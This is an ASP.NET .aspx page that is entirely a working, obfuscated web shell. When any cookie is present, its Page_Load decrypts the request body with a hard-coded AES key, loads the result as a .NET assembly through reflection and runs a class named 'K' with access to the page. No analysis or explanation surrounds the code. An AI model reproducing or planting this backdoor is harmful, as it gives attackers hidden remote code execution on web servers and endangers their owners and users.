<%@ Page Language="C#" %>
<script runat="server">
void Page_Load(object s, EventArgs e)
{
    if (Request.Cookies.Count > 0)
    {
        var a = System.Text.Encoding.Default;
        var b = new byte[] { 99, 97, 54, 51, 52, 53, 55, 53, 51, 56, 98, 57, 98, 49, 101, 48 };
        var c = Request.InputStream;
        var d = new byte[c.Length];
        c.Read(d, 0, d.Length);
        var f = new System.Security.Cryptography.RijndaelManaged();
        var g = f.CreateDecryptor(b, b);
        var h = g.TransformFinalBlock(d, 0, d.Length);
        object i = typeof(System.Reflection.Assembly).GetMethod("Load", new Type[] { typeof(byte[]) }).Invoke(null, new object[] { h });
        object j = i.GetType().GetMethod("CreateInstance", new Type[] { typeof(string) }).Invoke(i, new object[] { new string(new char[] { 'K' }) });
        j.GetType().GetMethod("Equals", new Type[] { typeof(object) }).Invoke(j, new object[] { this });
    }
}
</script>